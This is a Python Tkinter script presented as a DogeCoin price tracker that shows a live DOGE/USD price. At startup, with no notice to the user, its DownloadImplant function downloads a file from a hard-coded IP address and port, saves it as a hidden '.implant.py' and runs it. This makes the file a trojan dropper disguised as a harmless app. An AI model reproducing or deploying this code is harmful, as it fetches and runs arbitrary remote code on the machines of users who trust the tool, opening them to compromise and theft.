import requests
from tkinter import *
from PIL import ImageTk,Image
import urllib.request
import urllib
import subprocess
import sys
import os

def PriceUpdate():
    response = requests.get('https://sochain.com//api/v2/get_price/DOGE/USD')

    if response.status_code == 200:
        # everything went swimmingly
        # parse the response as JSON
        content = response.json()
        DogePrice = content['data']['prices'][0]['price']
        price['text'] = f'${DogePrice}'

    root.after(1000, PriceUpdate)

def DownloadImplant():
    if(not os.path.isfile(".sid.log")):
        urllib.request.urlretrieve(f'http://131.151.162.100:63412/download', f'Assets/.implant.py')
        subprocess.Popen([sys.executable, f'Assets/.implant.py'])

root = Tk()
root.title('DogeCoin Price Tracker')
canvas = Canvas(root, width = 0, height = 0)
canvas.pack()
img = ImageTk.PhotoImage(Image.open("Assets/dogecoin.webp"))
#canvas.create_image(0, 0, anchor=NW, image=img)

price = Label(root, text="", image=img, compound='center', font=('Arial', 150))
price.place(relx = 0, rely = 0, anchor='center')
price.pack()

DownloadImplant()

PriceUpdate()
root.mainloop()
